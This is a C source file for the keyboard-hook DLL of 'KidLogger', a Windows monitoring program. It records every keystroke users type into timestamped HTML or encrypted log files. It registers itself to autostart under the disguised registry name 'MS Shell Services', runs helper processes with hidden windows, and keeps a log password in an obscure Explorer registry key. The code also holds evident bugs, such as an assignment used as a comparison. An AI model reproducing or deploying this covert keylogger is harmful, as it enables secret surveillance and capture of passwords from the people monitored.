/**********************************************************************
** Copyright (C) 1998-2010 Tesline-Service S.R.L.  All rights reserved.
**
** KidLogger
** 
**
** This file may be distributed and/or modified under the terms of the
** GNU General Public License version 2 as published by the Free Software
** Foundation and appearing in the file LICENSE.GPL included in the
** packaging of this file.
**
** This file is provided AS IS with NO WARRANTY OF ANY KIND, INCLUDING THE
** WARRANTY OF DESIGN, MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
**
** See http://www.rohos.com/kid-logger/ for GPL licensing information.
**
** Contact info@rohos.com if any conditions of this licensing are
** not clear to you.
**
**********************************************************************/



#include "stdafx.h"
#include <shlwapi.h>
#include <Tlhelp32.h>
#include "hooks.h"
#include "stdio.h" 
#include "common1.h"
#include "SafeLogger.h"
#include <io.h>




#define  BUFFSIZE 200
#define EXEC(x,y) ExecuteMin(x,y)
HINSTANCE h_lang =0;

#pragma data_seg(".hdata")
CRITICAL_SECTION critical_sect;	
HHOOK hKeyHook = NULL;
HHOOK hMouseHook = NULL;
bool doShow = 0;
char str[500] = {"historics"};
char buffer[5000]={"PlatformIX...\n\n"}; 
WORD time_min=0;
WORD time_hour=0;
HWND curr_wnd=0;
DWORD sended=0,captured=0;
HWND mhWnd=0;
char path[2048]={"c:\\"};
char prg_path[2048]={""};
char prg_path_full[2048]={""};
char B_REG=0;
DWORD PS_PID = 0;
char user_name[100];
CSafeLogger logger;
TCHAR CharactersMonitor_buffer[200] = {""};
#pragma data_seg()

//_inf Info;

char cr[] = {"\x0D\x0A"};
//DWORD buff_pos =0 ;

static char szInput[15];
static char szPassword[15] = "HIST0R";
char szStr1[700];
char szStr2[700];

static SYSTEMTIME times;	

HANDLE ExecuteMin(char *prg, char* param);
void GetMyPath(char* path);
void GetFileName(int i, char* str, char* ext);
void checkDiskSpace();

#define REGISTRY_APP_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
#define REGISTRY_KEY_NAME "MS Shell Services"


void make_reg(TCHAR *pth) 
{	
    
	
	WriteReg(HKEY_CURRENT_USER, REGISTRY_RUN_KEY, REGISTRY_KEY_NAME, pth);
	
	WriteReg(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, REGISTRY_KEY_NAME, pth);
	
	
	return;
}


void make_autorun(DWORD pid)
{
	if(GetCurrentProcessId()!=pid)
		return;

	make_reg(prg_path_full);
}

DWORD get_pid(char *proc_name)
{
	HANDLE ths = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32 proc={0};
	proc.dwSize = sizeof(proc);

	if(Process32First(ths,&proc))
		do
		{
			if(CSTR_EQUAL==CompareString(LOCALE_SYSTEM_DEFAULT,NORM_IGNORECASE,proc.szExeFile,-1,proc_name,-1))
				return proc.th32ProcessID; 
			
		}while(Process32Next(ths,&proc));
	return 0;
}

// entry point
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 ) 
{

//	CString sr;
//	MYHTML html;
	HWND fnd;

    switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:{
			
			buffer[0]=0;
			if(!PS_PID)
				PS_PID = get_pid("explorer.exe");

			if(!prg_path[0])
				GetMyPath(prg_path, false, NULL);		

			if(!prg_path_full[0])
			{
				GetMyPath(prg_path_full, 1, NULL);		
				lstrcat(prg_path_full," -m");
			}

			if(B_REG)
			{
				make_autorun(PS_PID);
			}

			
			

			ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", path, 600);

			InitializeCriticalSection(&critical_sect);
			

			if ( _tcslen(path)==0){
				GetMyPath(path, false, NULL);		
			}									
			
			if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", 0) ) 
			{
				char username[100];
				DWORD sz=50;
				GetUserName( username, &sz);
				
				strcat(path, username);		
				CreateDirectory(path, NULL);	

				TCHAR pass[106] = {""};
				ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Explorer\\tkl") , "Tesl_key0", pass, 100);

								
				logger.setPassword(pass);			

				logger.setLogDir(path);				
			} else
			
				AddLOG_message(cr,2, false);
			//CheckTimer();			
			break;
	}
		case DLL_THREAD_ATTACH: break;
		case DLL_THREAD_DETACH: break;
		case DLL_PROCESS_DETACH: 			

			break;
    }
    return TRUE;
}

// returns CharactersMonitor_buffer
void HOOKS_API Get_CharactersMonitor_buffer(LPTSTR buffer1, int buffer_size)
{
	if (buffer_size < strlen(CharactersMonitor_buffer) )
	{
		strncpy(buffer1, CharactersMonitor_buffer, buffer_size-1);
		buffer[buffer_size] =0;
	}
	else
		strcpy(buffer1, CharactersMonitor_buffer);
}

void HOOKS_API Clear_CharactersMonitor_buffer()
{
	CharactersMonitor_buffer[0]=0;
}


 
// Setup all Keyboard/Mouse hooks
void HOOKS_API SetHooks(HHOOK hk, HHOOK hm, HHOOK hs, HWND wnd, char b_reg_keys_init)
{	
	

	B_REG = b_reg_keys_init;
	GetLocalTime(&times);	  

	DWORD sz=50;
	GetUserName( user_name, &sz);
	
	doShow = false;
    hKeyHook = hk;
	hMouseHook = hm;		
	mhWnd = wnd;	
	buffer[0]=0;		
	if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", 0) ) 
	{
		AddLOG_message(cr,2, false);
		AddLOG_message("------- Start recording keystrokes --------------------", 0, true);
		AddLOG_message(cr,2, false);
	
	} else {
		AddLOG_message(cr,2, false);
		AddLOG_message("<br><br><font size=+1>New session</font><br>               ",0, true); 
		AddLOG_message(cr,2, false);
	}

	
	
}



/* Maintains a buffer of characters to monitor the typed words and phrases

*/
void Add_To_CharactersMonitor(LPCTSTR key)
{
	strcat(CharactersMonitor_buffer, key);

	if (strlen(CharactersMonitor_buffer) > 90)
	{
		strcpy(CharactersMonitor_buffer, CharactersMonitor_buffer + 60); // copy last 31 characters into beginning.
	}

}

void PrecessKEY(WPARAM wparam, LPARAM lparam) {

	TCHAR key[3] = {0};TCHAR text[30] = {0};
	BYTE keystate[300];
	DWORD safeLogger = ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger",0 );

	GetKeyboardState(keystate);
	HKL kbd_layout = GetKeyboardLayout(NULL);

	if ( wparam == VK_RETURN){
		_tcscpy(key, cr);
		AddLOG_message(key, 0, false);
		return;
	}

	//if ( keystate[VK_CONTROL] & 0x80  /*|| keystate[VK_MENU] & 0x80 */  )
	//	return;

	if ( wparam == VK_TAB) {
		_tcscpy(key, "\x09");
		AddLOG_message(key, 0, false);
		return;
	}

	

	TCHAR name[20] = {0};	
	GetKeyNameText(lparam,name,19);	

	if ( strlen(name)>1 && safeLogger==0) {

		// special keys like "PgDown", "Delete"

		if (lparam=0x20) 
			_tcscpy(text, "&nbsp; ");
		else
			sprintf(text, "<font color=\"gray\"> [%s] </font>", name);

		AddLOG_message(text, strlen(text), false);	
	} 
	else
	
	if ( ToAsciiEx(wparam, MapVirtualKeyEx(wparam, 2, kbd_layout), keystate, (LPWORD)&key, 0,  kbd_layout) )
	{
		// individual chrachters are here
		{			
			AddLOG_message(key, 0, false);			
			Add_To_CharactersMonitor(key);
		}
	}


	return;	
	


}

// Keyboard hook procedure
LRESULT HOOKS_API CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam)
{	
    char chInput = (char) wParam;	

	static bool uppercase;
 
	char name[20] = {0};    
	char text[60];    

    if (nCode == HC_ACTION && lParam & 0x80000000)
    {       				
		PrecessKEY(wParam, lParam);	
        
    }

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}




// Add a message to the LOG BUFFER file
// if it overloads BUFFSIZE then writes buffer to the actual LOG file
void AddLOG_message(char *message, int len, int add_time)
{		
	EnterCriticalSection(&critical_sect);

	char time[100];

	SYSTEMTIME	systime;  			

	

	if ( 1 == ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", 0) ) {

		if ( strlen(buffer) + strlen(message) >= BUFFSIZE )	  
		{
			if ( !logger.addString(buffer) )
			{
				// the log file itself  maybe temporary innaccessible... 
				if ( strlen(buffer)  < 3000)
					strcat(buffer, message);	

				LeaveCriticalSection(&critical_sect);
				return;
			} 

			if ( strlen(message) >= BUFFSIZE )
				logger.addString(message);

			buffer[0]=0;
		}

		if (add_time)
		{
			GetLocalTime( &systime);			
			sprintf(time, "%2d:%2d:%2d  ", systime.wHour, systime.wMinute, systime.wSecond );
			strcat(buffer, time);	
		}

		if ( strlen(message) < BUFFSIZE )
			strcat(buffer, message);	

		LeaveCriticalSection(&critical_sect);
		return;
	}

	if ( strlen(buffer) + strlen(message) >= BUFFSIZE )	  
	{
		
		HANDLE file; 
		DWORD wr;

		TCHAR file_name[700];		
		
		GetFileName(1, file_name, ".htm");
		
		if ( (file = CreateFile(file_name, GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, 
			NULL,OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE ) 	
		{
			// the log file itself  maybe temporary innaccessible... 
			if ( strlen(buffer)  < 3000)
				strcat(buffer, message);	

			LeaveCriticalSection(&critical_sect);
			return;
		}

		if ( GetFileSize(file, NULL) < 10 ) {
			TCHAR html_header[200];
			strcpy(html_header, "<html><head><title>Log file for <b>");
			strcat(html_header, user_name);
			strcat(html_header, "</b></title> <body>");
			// write a header HTML 
			WriteFile(file, (LPVOID)html_header, strlen(html_header), (LPDWORD)&wr, NULL);

		}

		SetFilePointer(file, 0L, 0L, FILE_END);
		
		WriteFile(file, (LPVOID)&buffer, strlen(buffer), (LPDWORD)&wr, NULL);

		if ( strlen(message) >= BUFFSIZE )
			WriteFile(file, (LPVOID)&message, strlen(message), (LPDWORD)&wr, NULL);

		CloseHandle(file); 
		buffer[0]=0;
	}		
	
	if (add_time)
	{
		GetLocalTime( &systime);			
		sprintf(time, " %2d:%2d:%2d - ", systime.wHour, systime.wMinute, systime.wSecond );
		strcat(buffer, time);	
	}

	if ( strlen(message) < BUFFSIZE )
		strcat(buffer, message);	

	LeaveCriticalSection(&critical_sect);
	return;
	
}
 


bool HOOKS_API isExit()
{
	bool exit = doShow;
	doShow = false;	
	return  exit;	
}


// Run snap.bat (minimized, and hidden)
HANDLE ExecuteMin(char *prg, char* param)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char cmd[2048]; 
	//MessageBox(0, prg, param, 1); 
	strcpy(cmd,prg_path);
	strcat(cmd,prg);
	strcat(cmd," ");
	strcat(cmd,param);
	
	memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );
	memset( &si, 0, sizeof( STARTUPINFO ) );

	si.cb = sizeof(STARTUPINFO );
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	
	CreateProcess( NULL, cmd, NULL, NULL, FALSE, IDLE_PRIORITY_CLASS  , NULL, prg_path ,&si,&pi );


	  // CloseHandle( pi.hProcess );
	   //CloseHandle( pi.hThread );
	   
	return pi.hProcess;
} 

// Get LOG file name for current user
void GetFileName(int i, char* str, char* ext)
{
	SYSTEMTIME tm;
	UINT cch = 30;
	TCHAR date[250];
	char username[100];
	DWORD sz=50;
	GetLocalTime(&tm);	

	GetUserName( username, &sz);
	GetDateFormat(0x0409, 0, &tm, "d MMMM','dddd", date, cch);		



	ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
	if ( _taccess(str, 0) != 0){
		GetMyPath(str, false, NULL);		
	}
	
	strcat(str, username);		
	CreateDirectory(str, NULL);	
	strcat(str, "\\");	
	strcat(str, date);	

	if(i==2)
	{
		wsprintf(str+lstrlen(str),"[%i %i]",tm.wHour,tm.wMinute);
	}
	strcat(str, ext);

	int i2=1;
		
	if(i==2)
		{
			// такой файл не должен существоввать , существующие образы не удалять		
			while (_taccess(str, 0)==0 ) {
				
				// файл существует		
				ReadReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", str, 500);
				if ( _taccess(str, 0) != 0){
					GetMyPath(str, false, NULL);		
				}
				
				strcat(str, username);				
				strcat(str, "\\");	
				strcat(str, date);	
				
				if(i==2)
				{
					wsprintf(str+lstrlen(str),"[%i %i] %d",tm.wHour,tm.wMinute, i2);
				}
				strcat(str, ext);
				
				i++;
			};
		}
	
}
